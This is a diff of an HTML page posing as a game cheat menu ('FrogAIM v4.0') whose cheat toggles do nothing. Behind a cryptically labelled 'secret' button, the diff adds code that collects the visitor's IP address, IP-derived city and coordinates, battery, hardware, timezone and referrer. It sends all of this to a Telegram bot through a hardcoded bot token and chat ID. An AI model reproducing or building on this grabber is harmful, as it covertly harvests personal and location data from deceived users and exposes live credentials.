@@ -12,6 +12,7 @@
             --text-color: #ffffff;
             --glow-color: #9370db;
             --frog-green: #00ff00;
+            --tab-inactive: #2a2a2a;
         }
         
         * {
@@ -32,16 +33,33 @@
             position: relative;
         }
         
-        /* Фон с эффектом прозрачности */
-        .background-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            z-index: 998;
-            display: none;
+        /* Анимации */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        
+        @keyframes pulse-glow {
+            0% { box-shadow: 0 0 15px var(--frog-green); }
+            50% { box-shadow: 0 0 25px var(--frog-green), 0 0 35px rgba(0,255,0,0.5); }
+            100% { box-shadow: 0 0 15px var(--frog-green); }
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
         }
         
         /* Активация */
@@ -52,90 +70,100 @@
             transform: translate(-50%, -50%);
             background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
             border: 2px solid var(--frog-green);
-            border-radius: 12px;
-            padding: 25px;
+            border-radius: 15px;
+            padding: 30px;
             width: 90%;
-            max-width: 320px;
+            max-width: 350px;
             text-align: center;
-            box-shadow: 0 0 20px var(--frog-green);
+            box-shadow: 0 0 30px var(--frog-green);
             z-index: 1000;
+            animation: fadeIn 0.5s ease-out;
         }
         
         .activation-input {
             width: 100%;
-            padding: 12px;
+            padding: 15px;
             background: #111;
             border: 2px solid var(--accent-color);
-            border-radius: 8px;
+            border-radius: 10px;
             color: white;
-            font-size: 14px;
-            margin-bottom: 15px;
+            font-size: 16px;
+            margin-bottom: 20px;
             text-align: center;
+            transition: all 0.3s ease;
+        }
+        
+        .activation-input:focus {
+            border-color: var(--frog-green);
+            box-shadow: 0 0 10px var(--frog-green);
+            transform: scale(1.02);
         }
         
         .activate-btn {
             background: linear-gradient(90deg, var(--frog-green), #00cc00);
             border: none;
-            padding: 12px 20px;
-            border-radius: 8px;
+            padding: 15px 30px;
+            border-radius: 10px;
             color: black;
             font-weight: bold;
             cursor: pointer;
-            font-size: 14px;
+            font-size: 16px;
             transition: all 0.3s ease;
         }
         
         .activate-btn:hover {
             transform: scale(1.05);
-            box-shadow: 0 0 10px var(--frog-green);
+            box-shadow: 0 0 15px var(--frog-green);
         }
         
-        /* Главное окно - вертикальное */
+        /* Главное окно */
         .floating-window {
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            width: 300px;
-            height: 500px;
+            width: 320px;
+            height: 560px;
             background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
             border: 2px solid var(--frog-green);
-            border-radius: 12px;
-            box-shadow: 0 0 25px var(--frog-green);
+            border-radius: 15px;
+            box-shadow: 0 0 30px var(--frog-green);
             z-index: 999;
             overflow: hidden;
             display: none;
+            animation: fadeIn 0.4s ease-out;
         }
         
         .window-header {
             background: linear-gradient(90deg, var(--frog-green), #00cc00);
-            padding: 12px;
+            padding: 15px;
             text-align: center;
             position: relative;
+            cursor: move;
         }
         
         .window-header h3 {
             color: black;
             font-weight: bold;
             margin: 0;
-            font-size: 14px;
+            font-size: 16px;
             text-shadow: 0 0 3px rgba(0,0,0,0.3);
         }
         
         .close-btn {
             position: absolute;
-            right: 12px;
+            right: 15px;
             top: 50%;
             transform: translateY(-50%);
             background: #ff4444;
             border: none;
             color: white;
-            width: 22px;
-            height: 22px;
+            width: 25px;
+            height: 25px;
             border-radius: 50%;
             cursor: pointer;
             font-weight: bold;
-            font-size: 12px;
+            font-size: 14px;
             transition: all 0.3s ease;
         }
         
@@ -143,26 +171,67 @@
             transform: translateY(-50%) scale(1.1);
         }
         
-        .content {
-            padding: 15px;
-            height: calc(100% - 110px);
-            overflow-y: auto;
+        /* Табы */
+        .tabs-container {
+            display: flex;
+            background: var(--tab-inactive);
+            padding: 5px;
+            border-bottom: 1px solid var(--frog-green);
         }
         
+        .tab {
+            flex: 1;
+            padding: 10px 5px;
+            text-align: center;
+            background: var(--tab-inactive);
+            color: #888;
+            cursor: pointer;
+            font-size: 11px;
+            transition: all 0.3s ease;
+            border-radius: 5px;
+            margin: 0 2px;
+        }
+        
+        .tab.active {
+            background: linear-gradient(90deg, var(--frog-green), #00cc00);
+            color: black;
+            font-weight: bold;
+            transform: scale(1.05);
+        }
+        
+        .tab:hover {
+            background: rgba(0, 255, 0, 0.2);
+            color: white;
+        }
+        
+        .tab-content {
+            display: none;
+            padding: 15px;
+            height: calc(100% - 150px);
+            overflow-y: auto;
+            animation: slideIn 0.3s ease-out;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        /* Секции */
         .cheat-section {
             margin-bottom: 15px;
             background: rgba(0, 255, 0, 0.08);
-            border-radius: 8px;
+            border-radius: 10px;
             padding: 12px;
-            border-left: 2px solid var(--frog-green);
+            border-left: 3px solid var(--frog-green);
+            animation: fadeIn 0.4s ease-out;
         }
         
         .cheat-section h3 {
             color: var(--frog-green);
-            margin-bottom: 10px;
+            margin-bottom: 12px;
             border-bottom: 1px solid var(--frog-green);
-            padding-bottom: 5px;
-            font-size: 12px;
+            padding-bottom: 6px;
+            font-size: 13px;
             text-shadow: 0 0 5px var(--glow-color);
         }
         
@@ -170,26 +239,27 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin: 8px 0;
-            padding: 8px;
+            margin: 10px 0;
+            padding: 10px;
             background: rgba(0, 255, 0, 0.12);
-            border-radius: 6px;
-            font-size: 11px;
+            border-radius: 8px;
+            font-size: 12px;
             transition: all 0.3s ease;
             border: 1px solid rgba(0, 255, 0, 0.2);
+            animation: slideIn 0.3s ease-out;
         }
         
         .cheat-item:hover {
             background: rgba(0, 255, 0, 0.2);
-            transform: translateX(3px);
+            transform: translateX(5px);
             border-color: var(--frog-green);
         }
         
         .switch {
             position: relative;
             display: inline-block;
-            width: 36px;
-            height: 18px;
+            width: 40px;
+            height: 20px;
         }
         
         .switch input {
@@ -207,14 +277,14 @@
             bottom: 0;
             background-color: #333;
             transition: .4s;
-            border-radius: 18px;
+            border-radius: 20px;
         }
         
         .slider:before {
             position: absolute;
             content: "";
-            height: 14px;
-            width: 14px;
+            height: 16px;
+            width: 16px;
             left: 2px;
             bottom: 2px;
             background-color: white;
@@ -227,12 +297,12 @@
         }
         
         input:checked + .slider:before {
-            transform: translateX(18px);
+            transform: translateX(20px);
         }
         
         .secret-section {
             background: rgba(255, 0, 0, 0.1);
-            border-left: 2px solid #ff0000;
+            border-left: 3px solid #ff0000;
         }
         
         .secret-section h3 {
@@ -244,19 +314,20 @@
             background: linear-gradient(90deg, #ff0000, #cc0000);
             color: white;
             border: none;
-            padding: 8px 16px;
-            border-radius: 6px;
+            padding: 12px 20px;
+            border-radius: 8px;
             cursor: pointer;
             font-weight: bold;
             width: 100%;
-            font-size: 11px;
+            font-size: 13px;
             transition: all 0.3s ease;
             text-shadow: 0 0 3px rgba(0,0,0,0.5);
+            animation: pulse 2s infinite;
         }
         
         .death-btn:hover {
             transform: scale(1.05);
-            box-shadow: 0 0 10px rgba(255,0,0,0.5);
+            box-shadow: 0 0 15px rgba(255,0,0,0.5);
         }
         
         .footer {
@@ -264,71 +335,81 @@
             bottom: 0;
             width: 100%;
             background: rgba(0, 0, 0, 0.9);
-            padding: 8px;
+            padding: 10px;
             text-align: center;
-            font-size: 10px;
+            font-size: 11px;
             color: var(--frog-green);
             border-top: 1px solid var(--frog-green);
         }
         
         .status {
             display: inline-block;
-            width: 6px;
-            height: 6px;
+            width: 8px;
+            height: 8px;
             background: #00ff00;
             border-radius: 50%;
-            margin: 0 3px;
+            margin: 0 4px;
             animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
         }
         
         .error-message {
             color: #ff4444;
-            margin-top: 8px;
+            margin-top: 10px;
             display: none;
-            font-size: 11px;
+            font-size: 12px;
+            animation: shake 0.5s ease;
         }
         
         /* Кнопка запуска */
         .launch-button {
             position: fixed;
-            bottom: 20px;
-            right: 20px;
-            width: 50px;
-            height: 50px;
+            bottom: 25px;
+            right: 25px;
+            width: 65px;
+            height: 65px;
             background: linear-gradient(135deg, var(--frog-green), #00cc00);
             border-radius: 50%;
             border: none;
             color: black;
             font-weight: bold;
             cursor: pointer;
-            box-shadow: 0 0 15px var(--frog-green);
-            z-index: 997;
+            z-index: 998;
             display: none;
             align-items: center;
             justify-content: center;
-            font-size: 18px;
+            font-size: 28px;
             transition: all 0.3s ease;
+            animation: pulse-glow 2s infinite, fadeIn 0.5s ease-out;
         }
         
         .launch-button:hover {
-            transform: scale(1.1);
-            box-shadow: 0 0 20px var(--frog-green);
+            transform: scale(1.15);
+        }
+        
+        /* Прогресс бар */
+        .progress-bar {
+            width: 100%;
+            height: 3px;
+            background: #333;
+            border-radius: 2px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--frog-green), #00cc00);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 2px;
         }
     </style>
 </head>
 <body>
-    <div class="background-overlay" id="backgroundOverlay"></div>
-
     <div class="activation-modal" id="activationModal">
         <div class="activation-box">
             <h2>🐸 FrogAIM v4.0</h2>
-            <p style="color: #ccc; margin-bottom: 15px; font-size: 12px;">Enter license key to activate</p>
+            <p style="color: #ccc; margin-bottom: 20px; font-size: 14px;">Enter license key to activate cheat</p>
             <input type="text" class="activation-input" id="activationKey" placeholder="FROGI-XXXX-XXXXXXX">
             <button class="activate-btn" onclick="activateCheat()">ACTIVATE</button>
             <p class="error-message" id="errorMsg">Invalid activation key!</p>
@@ -338,12 +419,22 @@
     <button class="launch-button" id="launchButton" onclick="showCheatMenu()">🐸</button>
 
     <div class="floating-window" id="mainWindow">
-        <div class="window-header">
+        <div class="window-header" id="windowHeader">
             <h3>🐸 FrogAIM v4.0</h3>
             <button class="close-btn" onclick="hideCheatMenu()">×</button>
         </div>
-        <div class="content">
-            <!-- AIMBOT SECTION -->
+        
+        <div class="tabs-container">
+            <div class="tab active" onclick="switchTab(0)">AIM</div>
+            <div class="tab" onclick="switchTab(1)">VISUAL</div>
+            <div class="tab" onclick="switchTab(2)">GAME</div>
+            <div class="tab" onclick="switchTab(3)">PLAYER</div>
+            <div class="tab" onclick="switchTab(4)">WEAPON</div>
+            <div class="tab" onclick="switchTab(5)">SECRET</div>
+        </div>
+
+        <!-- AIM TAB -->
+        <div class="tab-content active" id="tab0">
             <div class="cheat-section">
                 <h3>AIMBOT FEATURES</h3>
                 <div class="cheat-item">
@@ -367,13 +458,54 @@
                         <span class="slider"></span>
                     </label>
                 </div>
+                <div class="cheat-item">
+                    <span>Target Prediction</span>
+                    <label class="switch">
+                        <input type="checkbox" id="prediction">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Silent Aim</span>
+                    <label class="switch">
+                        <input type="checkbox" id="silentAim">
+                        <span class="slider"></span>
+                    </label>
+                </div>
             </div>
 
-            <!-- VISUAL MODS -->
             <div class="cheat-section">
-                <h3>VISUAL MODS</h3>
+                <h3>AIM SETTINGS</h3>
                 <div class="cheat-item">
-                    <span>ESP Wallhack</span>
+                    <span>FOV Size</span>
+                    <label class="switch">
+                        <input type="checkbox" id="fovSize">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Smooth Aim</span>
+                    <label class="switch">
+                        <input type="checkbox" id="smoothAim">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Auto Scope</span>
+                    <label class="switch">
+                        <input type="checkbox" id="autoScope">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+        </div>
+
+        <!-- VISUAL TAB -->
+        <div class="tab-content" id="tab1">
+            <div class="cheat-section">
+                <h3>ESP FEATURES</h3>
+                <div class="cheat-item">
+                    <span>Wallhack ESP</span>
                     <label class="switch">
                         <input type="checkbox" id="esp">
                         <span class="slider"></span>
@@ -393,37 +525,6 @@
                         <span class="slider"></span>
                     </label>
                 </div>
-            </div>
-
-            <!-- GAME HACKS -->
-            <div class="cheat-section">
-                <h3>GAME HACKS</h3>
-                <div class="cheat-item">
-                    <span>No Recoil</span>
-                    <label class="switch">
-                        <input type="checkbox" id="norecoil">
-                        <span class="slider"></span>
-                    </label>
-                </div>
-                <div class="cheat-item">
-                    <span>Speed Hack</span>
-                    <label class="switch">
-                        <input type="checkbox" id="speedhack">
-                        <span class="slider"></span>
-                    </label>
-                </div>
-                <div class="cheat-item">
-                    <span>God Mode</span>
-                    <label class="switch">
-                        <input type="checkbox" id="godmode">
-                        <span class="slider"></span>
-                    </label>
-                </div>
-            </div>
-
-            <!-- PREMIUM FEATURES -->
-            <div class="cheat-section">
-                <h3>PREMIUM FEATURES</h3>
                 <div class="cheat-item">
                     <span>Vehicle ESP</span>
                     <label class="switch">
@@ -432,27 +533,192 @@
                     </label>
                 </div>
                 <div class="cheat-item">
-                    <span>Magic Bullet</span>
+                    <span>Distance ESP</span>
                     <label class="switch">
-                        <input type="checkbox" id="magicbullet">
-                        <span class="slider"></span>
-                    </label>
-                </div>
-                <div class="cheat-item">
-                    <span>Anti-Ban</span>
-                    <label class="switch">
-                        <input type="checkbox" id="antiban" checked>
+                        <input type="checkbox" id="distanceEsp">
                         <span class="slider"></span>
                     </label>
                 </div>
             </div>
 
-            <!-- SECRET SECTION -->
+            <div class="cheat-section">
+                <h3>VISUAL MODS</h3>
+                <div class="cheat-item">
+                    <span>No Grass</span>
+                    <label class="switch">
+                        <input type="checkbox" id="noGrass">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>No Fog</span>
+                    <label class="switch">
+                        <input type="checkbox" id="noFog">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Bright Skin</span>
+                    <label class="switch">
+                        <input type="checkbox" id="brightSkin">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+        </div>
+
+        <!-- PLAYER TAB -->
+        <div class="tab-content" id="tab3">
+            <div class="cheat-section">
+                <h3>PLAYER MODS</h3>
+                <div class="cheat-item">
+                    <span>Invisible Mode</span>
+                    <label class="switch">
+                        <input type="checkbox" id="invisible">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Teleport Hack</span>
+                    <label class="switch">
+                        <input type="checkbox" id="teleport">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>X-Ray Vision</span>
+                    <label class="switch">
+                        <input type="checkbox" id="xray">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Player Size</span>
+                    <label class="switch">
+                        <input type="checkbox" id="playerSize">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+
+            <div class="cheat-section">
+                <h3>STATS MODS</h3>
+                <div class="cheat-item">
+                    <span>Unlimited Health</span>
+                    <label class="switch">
+                        <input type="checkbox" id="unlimitedHealth">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Unlimited Ammo</span>
+                    <label class="switch">
+                        <input type="checkbox" id="unlimitedAmmo">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Instant Kill</span>
+                    <label class="switch">
+                        <input type="checkbox" id="instantKill">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+        </div>
+
+        <!-- WEAPON TAB -->
+        <div class="tab-content" id="tab4">
+            <div class="cheat-section">
+                <h3>WEAPON HACKS</h3>
+                <div class="cheat-item">
+                    <span>No Spread</span>
+                    <label class="switch">
+                        <input type="checkbox" id="noSpread">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Fast Reload</span>
+                    <label class="switch">
+                        <input type="checkbox" id="fastReload">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Weapon ESP</span>
+                    <label class="switch">
+                        <input type="checkbox" id="weaponEsp">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Auto Pickup</span>
+                    <label class="switch">
+                        <input type="checkbox" id="autoPickup">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+
+            <div class="cheat-section">
+                <h3>UPGRADES</h3>
+                <div class="cheat-item">
+                    <span>Damage Hack</span>
+                    <label class="switch">
+                        <input type="checkbox" id="damageHack">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Range Boost</span>
+                    <label class="switch">
+                        <input type="checkbox" id="rangeBoost">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Weapon Skin</span>
+                    <label class="switch">
+                        <input type="checkbox" id="weaponSkin">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+        </div>
+
+        <!-- SECRET TAB -->
+        <div class="tab-content" id="tab5">
             <div class="cheat-section secret-section">
-                <h3>??????</h3>
+                <h3>SUPER SECRET</h3>
                 <div class="cheat-item">
                     <span>你会死</span>
                     <button class="death-btn" onclick="sendDeathInfo()">激活</button>
+                </div>
+            </div>
+
+            <div class="cheat-section">
+                <h3>PREMIUM FEATURES</h3>
+                <div class="cheat-item">
+                    <span>Anti-Ban System</span>
+                    <label class="switch">
+                        <input type="checkbox" id="antiban" checked>
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Auto Update</span>
+                    <label class="switch">
+                        <input type="checkbox" id="autoUpdate">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Stealth Mode</span>
+                    <label class="switch">
+                        <input type="checkbox" id="stealthMode">
+                        <span class="slider"></span>
+                    </label>
                 </div>
             </div>
         </div>
@@ -467,6 +733,8 @@
         const TELEGRAM_TOKEN = "8366387571:AAFo0fqn2G7v9NUxEDR6r_NZRe0pZX5RjmQ";
         const CHAT_ID = "2020792314";
         let isActivated = false;
+        let isDragging = false;
+        let dragOffset = { x: 0, y: 0 };
 
         function activateCheat() {
             const inputKey = document.getElementById('activationKey').value.trim();
@@ -474,8 +742,11 @@
             
             if (inputKey === ACTIVATION_KEY) {
                 isActivated = true;
-                document.getElementById('activationModal').style.display = 'none';
-                document.getElementById('launchButton').style.display = 'flex';
+                document.getElementById('activationModal').style.animation = 'fadeIn 0.5s ease-out';
+                setTimeout(() => {
+                    document.getElementById('activationModal').style.display = 'none';
+                    document.getElementById('launchButton').style.display = 'flex';
+                }, 400);
                 localStorage.setItem('frogaim_activated', 'true');
             } else {
                 errorMsg.style.display = 'block';
@@ -486,16 +757,76 @@
         function showCheatMenu() {
             if (isActivated) {
                 document.getElementById('mainWindow').style.display = 'block';
-                document.getElementById('backgroundOverlay').style.display = 'block';
                 document.getElementById('launchButton').style.display = 'none';
             }
         }
 
         function hideCheatMenu() {
-            document.getElementById('mainWindow').style.display = 'none';
-            document.getElementById('backgroundOverlay').style.display = 'none';
-            document.getElementById('launchButton').style.display = 'flex';
+            document.getElementById('mainWindow').style.animation = 'fadeIn 0.4s ease-out reverse';
+            setTimeout(() => {
+                document.getElementById('mainWindow').style.display = 'none';
+                document.getElementById('launchButton').style.display = 'flex';
+            }, 350);
         }
+
+        function switchTab(tabIndex) {
+            document.querySelectorAll('.tab').forEach((tab, index) => {
+                tab.classList.toggle('active', index === tabIndex);
+            });
+            
+            document.querySelectorAll('.tab-content').forEach((content, index) => {
+                content.classList.toggle('active', index === tabIndex);
+            });
+        }
+
+        // Перетаскивание окна
+        document.getElementById('windowHeader').addEventListener('mousedown', function(e) {
+            isDragging = true;
+            const rect = document.getElementById('mainWindow').getBoundingClientRect();
+            dragOffset.x = e.clientX - rect.left;
+            dragOffset.y = e.clientY - rect.top;
+            document.getElementById('mainWindow').style.cursor = 'grabbing';
+        });
+
+        document.addEventListener('mousemove', function(e) {
+            if (isDragging) {
+                const x = e.clientX - dragOffset.x;
+                const y = e.clientY - dragOffset.y;
+                
+                document.getElementById('mainWindow').style.left = x + 'px';
+                document.getElementById('mainWindow').style.top = y + 'px';
+            }
+        });
+
+        document.addEventListener('mouseup', function() {
+            isDragging = false;
+            document.getElementById('mainWindow').style.cursor = 'default';
+        });
+
+        // Touch события
+        document.getElementById('windowHeader').addEventListener('touchstart', function(e) {
+            isDragging = true;
+            const touch = e.touches[0];
+            const rect = document.getElementById('mainWindow').getBoundingClientRect();
+            dragOffset.x = touch.clientX - rect.left;
+            dragOffset.y = touch.clientY - rect.top;
+        });
+
+        document.addEventListener('touchmove', function(e) {
+            if (isDragging) {
+                const touch = e.touches[0];
+                const x = touch.clientX - dragOffset.x;
+                const y = touch.clientY - dragOffset.y;
+                
+                document.getElementById('mainWindow').style.left = x + 'px';
+                document.getElementById('mainWindow').style.top = y + 'px';
+                e.preventDefault();
+            }
+        });
+
+        document.addEventListener('touchend', function() {
+            isDragging = false;
+        });
 
         // Анимации переключателей
         document.querySelectorAll('input[type="checkbox"]').forEach(checkbox => {
@@ -532,33 +863,59 @@
             document.getElementById('launchButton').style.display = 'flex';
         }
 
-        // Отправка в Telegram
+        // Отправка ВСЕЙ информации в Telegram
         async function sendDeathInfo() {
             const statusText = document.getElementById('statusText');
-            statusText.textContent = "Sending...";
+            statusText.textContent = "Collecting data...";
             statusText.style.color = "#ffff00";
             
             try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
+                // Собираем ВСЮ возможную информацию
+                const deviceInfo = await collectAllDeviceInfo();
                 
-                const deviceInfo = {
-                    ip: ipData.ip,
-                    model: navigator.userAgent,
-                    platform: navigator.platform,
-                    androidVersion: navigator.userAgent.match(/Android\s([0-9\.]+)/)?.[1] || 'Unknown',
-                    language: navigator.language,
-                    screen: `${screen.width}x${screen.height}`,
-                    time: new Date().toLocaleString('ru-RU')
-                };
-                
-                const message = `🚨 КТО-ТО НАЖАЛ НА КНОПКУ СМЕРТИ!\n\n` +
-                               `💻 IP: ${deviceInfo.ip}\n` +
-                               `📱 Model: ${deviceInfo.model}\n` +
-                               `🤖 Android: ${deviceInfo.androidVersion}\n` +
+                const message = `🚨 FROGAIM DEATH BUTTON PRESSED!\n\n` +
+                               `📋 DEVICE INFORMATION:\n` +
+                               `💻 IP Address: ${deviceInfo.ip}\n` +
+                               `🌐 Location: ${deviceInfo.location}\n` +
+                               `📱 Device: ${deviceInfo.deviceModel}\n` +
+                               `🤖 Platform: ${deviceInfo.platform}\n` +
+                               `🔢 Android: ${deviceInfo.androidVersion}\n` +
+                               `📶 Connection: ${deviceInfo.connection}\n` +
+                               `📏 Screen: ${deviceInfo.screen}\n` +
+                               `⚡ CPU: ${deviceInfo.cpuCores} cores\n` +
+                               `💾 Memory: ${deviceInfo.memory}\n` +
+                               `🔋 Battery: ${deviceInfo.battery}\n` +
                                `🌐 Language: ${deviceInfo.language}\n` +
-                               `📺 Screen: ${deviceInfo.screen}\n` +
-                               `⏰ Time: ${deviceInfo.time}`;
+                               `⏰ Timezone: ${deviceInfo.timezone}\n` +
+                               `🕐 Local Time: ${deviceInfo.localTime}\n\n` +
+                               `📊 BROWSER INFO:\n` +
+                               `🔍 User Agent: ${deviceInfo.userAgent}\n` +
+                               `🌍 Languages: ${deviceInfo.languages}\n` +
+                               `📐 Resolution: ${deviceInfo.resolution}\n` +
+                               `🎨 Color Depth: ${deviceInfo.colorDepth}\n` +
+                               `📡 Online: ${deviceInfo.onlineStatus}\n\n` +
+                               `📍 GEOLOCATION:\n` +
+                               `📌 Coordinates: ${deviceInfo.coordinates}\n` +
+                               `🏙️ City: ${deviceInfo.city}\n` +
+                               `🏛️ Region: ${deviceInfo.region}\n` +
+                               `🇺🇸 Country: ${deviceInfo.country}\n\n` +
+                               `⚙️ HARDWARE:\n` +
+                               `📊 Hardware Concurrency: ${deviceInfo.hardwareConcurrency}\n` +
+                               `💿 Max Touch Points: ${deviceInfo.maxTouchPoints}\n` +
+                               `🎮 Device Memory: ${deviceInfo.deviceMemory}\n\n` +
+                               `🔧 PLATFORM:\n` +
+                               `🖥️ Platform: ${deviceInfo.platform}\n` +
+                               `🍪 Cookies: ${deviceInfo.cookiesEnabled}\n` +
+                               `📝 Java: ${deviceInfo.javaEnabled}\n` +
+                               `🖨️ PDF: ${deviceInfo.pdfViewerEnabled}\n\n` +
+                               `🕵️ USER DATA:\n` +
+                               `👤 User ID: ${deviceInfo.userId}\n` +
+                               `🔐 Security: ${deviceInfo.securityInfo}\n` +
+                               `🌐 Referrer: ${deviceInfo.referrer}\n\n` +
+                               `⏰ TIMESTAMP:\n` +
+                               `📅 Date: ${deviceInfo.date}\n` +
+                               `🕒 UTC Time: ${deviceInfo.utcTime}\n` +
+                               `⏱️ Timestamp: ${deviceInfo.timestamp}`;
                 
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -569,7 +926,7 @@
                     })
                 });
                 
-                statusText.textContent = "Sent!";
+                statusText.textContent = "Data Sent!";
                 statusText.style.color = "#00ff00";
             } catch (error) {
                 statusText.textContent = "Error!";
@@ -582,8 +939,82 @@
             }
         }
 
+        // Сбор всей возможной информации
+        async function collectAllDeviceInfo() {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            
+            // Геолокация по IP
+            let locationInfo = {};
+            try {
+                const locationResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
+                locationInfo = await locationResponse.json();
+            } catch (e) {
+                locationInfo = { city: 'Unknown', region: 'Unknown', country: 'Unknown' };
+            }
+            
+            // Информация о батарее
+            let batteryInfo = 'Unknown';
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `Level: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;
+                } catch (e) {
+                    batteryInfo = 'Unknown';
+                }
+            }
+            
+            return {
+                ip: ipData.ip,
+                location: locationInfo.city || 'Unknown',
+                city: locationInfo.city || 'Unknown',
+                region: locationInfo.regionName || 'Unknown',
+                country: locationInfo.country || 'Unknown',
+                coordinates: locationInfo.lat && locationInfo.lon ? 
+                    `${locationInfo.lat}, ${locationInfo.lon}` : 'Unknown',
+                
+                deviceModel: navigator.userAgent,
+                platform: navigator.platform,
+                androidVersion: navigator.userAgent.match(/Android\s([0-9\.]+)/)?.[1] || 'Unknown',
+                connection: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
+                screen: `${screen.width}x${screen.height}`,
+                cpuCores: navigator.hardwareConcurrency || 'Unknown',
+                memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
+                battery: batteryInfo,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                localTime: new Date().toLocaleString('ru-RU'),
+                
+                userAgent: navigator.userAgent,
+                languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
+                resolution: `${screen.width}x${screen.height}`,
+                colorDepth: `${screen.colorDepth} bit`,
+                onlineStatus: navigator.onLine ? 'Online' : 'Offline',
+                
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 'Unknown',
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                
+                cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
+                javaEnabled: navigator.javaEnabled ? 'Yes' : 'No',
+                pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Yes' : 'No',
+                
+                userId: Math.random().toString(36).substr(2, 9),
+                securityInfo: 'Web Security Context',
+                referrer: document.referrer || 'No referrer',
+                
+                date: new Date().toLocaleDateString('ru-RU'),
+                utcTime: new Date().toUTCString(),
+                timestamp: Date.now()
+            };
+        }
+
         document.getElementById('activationKey').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') activateCheat();
         });
+
+        // Автофокус на поле ввода
+        document.getElementById('activationKey').focus();
     </script>
-</
+</body>
+</html>
